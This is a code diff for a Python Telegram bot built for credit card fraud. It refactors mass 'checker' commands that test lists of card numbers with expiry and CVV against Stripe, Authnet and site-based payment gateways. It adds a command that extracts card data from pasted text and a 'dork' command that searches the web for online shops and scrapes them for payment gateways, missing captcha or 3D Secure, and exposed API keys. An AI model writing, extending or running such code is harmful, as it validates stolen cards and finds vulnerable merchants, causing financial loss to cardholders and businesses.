@@ -16,6 +16,7 @@ import psutil
 import platform
 from datetime import datetime
 import io
+import bs4
 import stripe
 
 #====================================================================#
@@ -1353,10 +1354,7 @@ def handle_mpy(message):
 
     except Exception as e:
         bot.reply_to(message, f"❌ An error occurred: {str(e)}")
-
-# --------------------
-# MASS QQ CHECK
-# --------------------
+# Handle /mqq command
 @bot.message_handler(commands=['mqq'])
 @bot.message_handler(func=lambda m: m.text and m.text.startswith('.mqq'))
 def handle_mqq(message):
@@ -1364,14 +1362,25 @@ def handle_mqq(message):
     init_user(user_id, message.from_user.username)
 
     try:
-        cards_text = message.text.split()[1:] if len(message.text.split()) > 1 else None
-        if not cards_text and message.reply_to_message:
+        cards_text = None
+        command_parts = message.text.split()
+
+        if len(command_parts) > 1:
+            cards_text = ' '.join(command_parts[1:])
+        elif message.reply_to_message:
             cards_text = message.reply_to_message.text
-        elif not cards_text:
+        else:
             bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
             return
 
-        cards = [c.strip() for line in cards_text for c in line.split() if '|' in c]
+        cards = []
+        for line in cards_text.split('\n'):
+            line = line.strip()
+            if line:
+                for card in line.split():
+                    if '|' in card:
+                        cards.append(card.strip())
+
         if not cards:
             bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
             return
@@ -1386,48 +1395,72 @@ def handle_mqq(message):
 
         initial_msg = f"🚀 Starting mass Stripe Square check of {len(cards)} cards..."
         status_message = bot.reply_to(message, initial_msg)
+
         gateway = "Stripe Square [0.20$]"
+
+        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
+        bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=status_message.message_id,
+            text=initial_processing_msg,
+            parse_mode='HTML'
+        )
+
         start_time = time.time()
 
         def process_cards():
-            results = []
-            for i, card in enumerate(cards, 1):
-                try:
-                    result = check_qq_card(card)
-                    results.append({'card': card, 'status': result['status'], 'response': result['response'], 'gateway': result.get('gateway', gateway)})
+            try:
+                results = []
+                for i, card in enumerate(cards, 1):
+                    try:
+                        result = check_qq_card(card)
+                        results.append({
+                            'card': card,
+                            'status': result['status'],
+                            'response': result['response'],
+                            'gateway': result.get('gateway', 'Stripe Square [0.20$]')
+                        })
+                    except Exception as e:
+                        results.append({
+                            'card': card,
+                            'status': 'ERROR',
+                            'response': f'Error: {str(e)}',
+                            'gateway': gateway
+                        })
 
-                    # Send approved to group
-                    if result["status"].upper() == "APPROVED":
-                        send_to_group(
-                            cc=card,
-                            gateway=result["gateway"],
-                            response=result["response"],
-                            bin_info=get_bin_info(card.split('|')[0][:6]) or {},
-                            time_taken=round(time.time() - start_time, 2),
-                            user_info=message.from_user
-                        )
-                except Exception as e:
-                    results.append({'card': card, 'status': 'ERROR', 'response': f'Error: {str(e)}', 'gateway': gateway})
+                    current_time = time.time() - start_time
+                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
+                    bot.edit_message_text(
+                        chat_id=message.chat.id,
+                        message_id=status_message.message_id,
+                        text=progress_msg,
+                        parse_mode='HTML'
+                    )
 
-                current_time = time.time() - start_time
-                progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
-                bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
-                                      text=progress_msg, parse_mode='HTML')
+                final_time = time.time() - start_time
+                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=status_message.message_id,
+                    text=final_msg,
+                    parse_mode='HTML'
+                )
+            except Exception as e:
+                error_msg = f"Mass Stripe Square check failed: {str(e)}"
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=status_message.message_id,
+                    text=error_msg,
+                    parse_mode='HTML'
+                )
 
-            final_time = time.time() - start_time
-            final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
-            bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
-                                  text=final_msg, parse_mode='HTML')
-
-        threading.Thread(target=process_cards).start()
+        thread = threading.Thread(target=process_cards)
+        thread.start()
 
     except Exception as e:
         bot.reply_to(message, f"❌ An error occurred: {str(e)}")
 
-
-# --------------------
-# MASS CC CHECK
-# --------------------
+# Handle /mcc command
 @bot.message_handler(commands=['mcc'])
 @bot.message_handler(func=lambda m: m.text and m.text.startswith('.mcc'))
 def handle_mcc(message):
@@ -1435,14 +1468,25 @@ def handle_mcc(message):
     init_user(user_id, message.from_user.username)
 
     try:
-        cards_text = message.text.split()[1:] if len(message.text.split()) > 1 else None
-        if not cards_text and message.reply_to_message:
+        cards_text = None
+        command_parts = message.text.split()
+
+        if len(command_parts) > 1:
+            cards_text = ' '.join(command_parts[1:])
+        elif message.reply_to_message:
             cards_text = message.reply_to_message.text
-        elif not cards_text:
+        else:
             bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
             return
 
-        cards = [c.strip() for line in cards_text for c in line.split() if '|' in c]
+        cards = []
+        for line in cards_text.split('\n'):
+            line = line.strip()
+            if line:
+                for card in line.split():
+                    if '|' in card:
+                        cards.append(card.strip())
+
         if not cards:
             bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
             return
@@ -1457,39 +1501,67 @@ def handle_mcc(message):
 
         initial_msg = f"🚀 Starting mass Site Based check of {len(cards)} cards..."
         status_message = bot.reply_to(message, initial_msg)
+
         gateway = "Site Based [1$]"
+
+        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
+        bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=status_message.message_id,
+            text=initial_processing_msg,
+            parse_mode='HTML'
+        )
+
         start_time = time.time()
 
         def process_cards():
-            results = []
-            for i, card in enumerate(cards, 1):
-                try:
-                    result = process_cc_card(card)
-                    results.append({'card': card, 'status': result['status'], 'response': result['response'], 'gateway': result.get('gateway', gateway)})
+            try:
+                results = []
+                for i, card in enumerate(cards, 1):
+                    try:
+                        result = process_cc_card(card)
+                        results.append({
+                            'card': card,
+                            'status': result['status'],
+                            'response': result['response'],
+                            'gateway': result.get('gateway', 'Site Based [1$]')
+                        })
+                    except Exception as e:
+                        results.append({
+                            'card': card,
+                            'status': 'ERROR',
+                            'response': f'Error: {str(e)}',
+                            'gateway': gateway
+                        })
 
-                    if result["status"].upper() == "APPROVED":
-                        send_to_group(
-                            cc=card,
-                            gateway=result["gateway"],
-                            response=result["response"],
-                            bin_info=get_bin_info(card.split('|')[0][:6]) or {},
-                            time_taken=round(time.time() - start_time, 2),
-                            user_info=message.from_user
-                        )
-                except Exception as e:
-                    results.append({'card': card, 'status': 'ERROR', 'response': f'Error: {str(e)}', 'gateway': gateway})
+                    current_time = time.time() - start_time
+                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
+                    bot.edit_message_text(
+                        chat_id=message.chat.id,
+                        message_id=status_message.message_id,
+                        text=progress_msg,
+                        parse_mode='HTML'
+                    )
 
-                current_time = time.time() - start_time
-                progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
-                bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
-                                      text=progress_msg, parse_mode='HTML')
+                final_time = time.time() - start_time
+                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=status_message.message_id,
+                    text=final_msg,
+                    parse_mode='HTML'
+                )
+            except Exception as e:
+                error_msg = f"Mass Site Based check failed: {str(e)}"
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=status_message.message_id,
+                    text=error_msg,
+                    parse_mode='HTML'
+                )
 
-            final_time = time.time() - start_time
-            final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
-            bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
-                                  text=final_msg, parse_mode='HTML')
-
-        threading.Thread(target=process_cards).start()
+        thread = threading.Thread(target=process_cards)
+        thread.start()
 
     except Exception as e:
         bot.reply_to(message, f"❌ An error occurred: {str(e)}")
@@ -1554,9 +1626,7 @@ def handle_at(message):
                           text=response_text, parse_mode='HTML')
 
 
-# --------------------
-# MASS AT CHECK
-# --------------------
+# Handle /mat command
 @bot.message_handler(commands=['mat'])
 @bot.message_handler(func=lambda m: m.text and m.text.startswith('.mat'))
 def handle_mat(message):
@@ -1564,14 +1634,25 @@ def handle_mat(message):
     init_user(user_id, message.from_user.username)
 
     try:
-        cards_text = message.text.split()[1:] if len(message.text.split()) > 1 else None
-        if not cards_text and message.reply_to_message:
+        cards_text = None
+        command_parts = message.text.split()
+
+        if len(command_parts) > 1:
+            cards_text = ' '.join(command_parts[1:])
+        elif message.reply_to_message:
             cards_text = message.reply_to_message.text
-        elif not cards_text:
+        else:
             bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
             return
 
-        cards = [c.strip() for line in cards_text for c in line.split() if '|' in c]
+        cards = []
+        for line in cards_text.split('\n'):
+            line = line.strip()
+            if line:
+                for card in line.split():
+                    if '|' in card:
+                        cards.append(card.strip())
+
         if not cards:
             bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
             return
@@ -1585,51 +1666,74 @@ def handle_mat(message):
 
         initial_msg = f"🚀 Starting mass AT check of {len(cards)} cards..."
         status_message = bot.reply_to(message, initial_msg)
-        start_time = time.time()
 
         try:
-            gateway = process_card_at(cards[0]).get("gateway", "Authnet [5$]")
+            first_card_result = process_card_at(cards[0])
+            gateway = first_card_result.get("gateway", "Authnet [5$]")
         except:
             gateway = "Authnet [5$]"
 
         initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
-        bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
-                              text=initial_processing_msg, parse_mode='HTML')
+        bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=status_message.message_id,
+            text=initial_processing_msg,
+            parse_mode='HTML'
+        )
+
+        start_time = time.time()
 
         def process_cards():
-            results = []
-            with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
-                future_to_card = {executor.submit(process_card_at, card): card for card in cards}
-                for i, future in enumerate(concurrent.futures.as_completed(future_to_card), 1):
-                    card = future_to_card[future]
-                    try:
-                        result = future.result()
-                        results.append({'card': card, 'status': result['status'], 'response': result['response'], 'gateway': result.get('gateway', gateway)})
+            try:
+                results = []
+                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
+                    future_to_card = {executor.submit(process_card_at, card): card for card in cards}
+                    for i, future in enumerate(concurrent.futures.as_completed(future_to_card), 1):
+                        card = future_to_card[future]
+                        try:
+                            result = future.result()
+                            results.append({
+                                'card': card,
+                                'status': result['status'],
+                                'response': result['response'],
+                                'gateway': result.get('gateway', 'Authnet [5$]')
+                            })
+                        except Exception as e:
+                            results.append({
+                                'card': card,
+                                'status': 'ERROR',
+                                'response': f'Error: {str(e)}',
+                                'gateway': gateway
+                            })
 
-                        if result["status"].upper() == "APPROVED":
-                            send_to_group(
-                                cc=card,
-                                gateway=result["gateway"],
-                                response=result["response"],
-                                bin_info=get_bin_info(card.split('|')[0][:6]) or {},
-                                time_taken=round(time.time() - start_time, 2),
-                                user_info=message.from_user
-                            )
+                        current_time = time.time() - start_time
+                        progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
+                        bot.edit_message_text(
+                            chat_id=message.chat.id,
+                            message_id=status_message.message_id,
+                            text=progress_msg,
+                            parse_mode='HTML'
+                        )
 
-                    except Exception as e:
-                        results.append({'card': card, 'status': 'ERROR', 'response': f'Error: {str(e)}', 'gateway': gateway})
+                final_time = time.time() - start_time
+                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=status_message.message_id,
+                    text=final_msg,
+                    parse_mode='HTML'
+                )
+            except Exception as e:
+                error_msg = f"Mass AT check failed: {str(e)}"
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=status_message.message_id,
+                    text=error_msg,
+                    parse_mode='HTML'
+                )
 
-                    current_time = time.time() - start_time
-                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
-                    bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
-                                          text=progress_msg, parse_mode='HTML')
-
-            final_time = time.time() - start_time
-            final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
-            bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
-                                  text=final_msg, parse_mode='HTML')
-
-        threading.Thread(target=process_cards).start()
+        thread = threading.Thread(target=process_cards)
+        thread.start()
 
     except Exception as e:
         bot.reply_to(message, f"❌ An error occurred: {str(e)}")
@@ -2201,9 +2305,6 @@ def handle_svb(message):
                                                    user_status, bin_info, time_taken, check_result["status"]),
                           parse_mode='HTML')
 
-# --------------------
-# MASS SECURE VBV CHECK
-# --------------------
 @bot.message_handler(commands=['msvb'])
 @bot.message_handler(func=lambda m: m.text and m.text.startswith('.msvb'))
 def handle_msvb(message):
@@ -2269,6 +2370,149 @@ def handle_msvb(message):
 
 
 #=============================================================================================================================================#
+def extract_ccs(text):
+    cc_pattern = r'\b(?:\d[ -]*?){13,16}[|:/\- ]\d{1,2}[|:/\- ]\d{2,4}[|:/\- ]\d{3,4}\b'
+    matches = re.findall(cc_pattern, text)
+    cleaned = []
+
+    for match in matches:
+        nums = re.split(r'[|:/\- ]+', match)
+        if len(nums) == 4:
+            cc, mm, yy, cvv = nums
+            if len(yy) == 2:
+                yy = "20" + yy
+            cleaned.append(f"{cc}|{mm}|{yy}|{cvv}")
+    return cleaned
+
+@bot.message_handler(commands=['fl'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.fl'))
+def format_list(message):
+    target_text = message.text
+
+    # If replying to message, extract that instead
+    if message.reply_to_message:
+        target_text = message.reply_to_message.text
+
+    ccs = extract_ccs(target_text)
+    if not ccs:
+        bot.reply_to(message, "❌ No valid CCs found.")
+        return
+
+    formatted = "\n".join(ccs)
+    count = len(ccs)
+
+    msg = f"✅ Extracted {count} card(s):\n\n<code>{formatted}</code>"
+    bot.reply_to(message, msg, parse_mode="HTML")
+
+@bot.message_handler(commands=['dork'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.dork'))
+def handle_dork(message):
+    user_id = str(message.from_user.id)
+    chat_id = str(message.chat.id)
+
+    parts = message.text.split(maxsplit=1)
+    if len(parts) != 2:
+        bot.reply_to(message, "❌ Usage: /dork <keyword> or .dork <keyword>")
+        return
+
+    query = parts[1]
+    msg = bot.reply_to(message, "🔍 Dorking... Please wait.")
+
+    # Skip known brands
+    skip_domains = [
+        "google.com", "facebook.com", "github.com", "paypal.com", "stripe.com", "microsoft.com", "cloudflare.com",
+        "razorpay.com", "adyen.com", "paytm.com", "shopify.com", "mozilla.org", "youtube.com", "apple.com",
+        "linkedin.com", "amazon.com", "twitter.com", "openai.com", "braintreepayments.com"
+    ]
+
+    gateways = [
+        "paypal", "stripe", "razorpay", "adyen", "paytm", "checkout.com", "square", "shopify", "braintree",
+        "authorize.net", "payu", "worldpay", "mollie", "skrill", "klarna", "paddle", "2checkout", "bluepay",
+        "bitpay", "afterpay", "sezzle", "stax", "payoneer", "payza", "paytrace", "payeezy", "cybersource",
+        "eway", "chasepaymentech", "magento"
+    ]
+
+    card_fields = ["credit card", "card number", "security code", "expiration date", "cvv", "cnn", "cardholder name"]
+
+    def status_icon(b): return "✅" if b else "⛔️"
+
+    def get_cms(text):
+        if "magento" in text: return "Magento"
+        if "woocommerce" in text: return "WooCommerce"
+        if "shopify" in text: return "shopify"
+        if "drupal" in text: return "Drupal"
+        if "wordpress" in text: return "WordPress"
+        return "Unknown"
+
+    def format_result(url, gateways, captcha, cloudflare, graphql, tokens, js_count, secure_type, cms, card_hits):
+        return f"""
+➤ Site → <code>{url}</code>
+
+🔍 Info:
+   └─𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀: {', '.join(gateways) if gateways else '❌'}
+
+🛡️ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆:
+   ├─ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮: {status_icon(captcha)}
+   ├─ 𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲: {status_icon(cloudflare)}
+   ├─ 𝗚𝗿𝗮𝗽𝗵𝗤𝗟: {status_icon(graphql)}
+   ├─ Tokens Found:   {tokens}
+   └─ Payment JS Libs:{js_count} found
+
+🛍️ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺:
+   ├─ 𝗖𝗠𝗦: {cms}
+   ├─ 2𝗗/𝟯𝗗: {secure_type}
+   └─ 𝗖𝗮𝗿𝗱𝘀: {', '.join(card_hits) if card_hits else '❌'}
+─────── ⸙ ────────
+"""
+
+    try:
+        from googlesearch import search
+        from fake_useragent import UserAgent
+        ua = UserAgent()
+        headers = {"User-Agent": ua.random}
+    except:
+        headers = {"User-Agent": "Mozilla/5.0"}
+
+    found = 0
+    output = ""
+    try:
+        for url in search(query, num_results=50):
+            domain = urlparse(url).netloc.replace("www.", "")
+            if any(skip in domain for skip in skip_domains):
+                continue
+
+            try:
+                res = requests.get(url, headers=headers, timeout=10)
+                html = res.text.lower()
+                soup = BeautifulSoup(res.text, "html.parser")
+                scripts = " ".join([s.get_text() for s in soup.find_all("script")])
+            except:
+                continue
+
+            text = html + scripts
+            card_hits = [c for c in card_fields if c in text]
+            gws = [g for g in gateways if g in text]
+            endpoints = re.findall(r"/(checkout|pay|payment|charge|intent)[^\s\"\'<>]*", text)
+            graphql = "graphql" in text
+            captcha = bool(re.search(r'captcha|recaptcha|hcaptcha|i am human|cf-chl', text))
+            cloudflare = "cloudflare" in res.headers.get("server", "").lower() or "cf-ray" in res.headers
+            tokens = len(re.findall(r"(client_secret|access_token|pk_live|pk_test)", text))
+            js_libs = len([s for s in soup.find_all("script") if any(g in str(s) for g in gateways)])
+            secure_type = "3D Secure" if "3d secure" in text else "Possibly 2D" if "2d secure" in text else "Unknown"
+            cms = get_cms(text)
+
+            result = format_result(url, gws, captcha, cloudflare, graphql, tokens, js_libs, secure_type, cms, card_hits)
+            output += result
+            found += 1
+            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=output[:4096], parse_mode="HTML")
+
+            if found >= 5:
+                break
+
+        if found == 0:
+            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text="❌ No valid results found.")
+    except Exception as e:
+        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=f"❌ Error: {e}")
 
 # System monitoring functions
 def get_system_info():
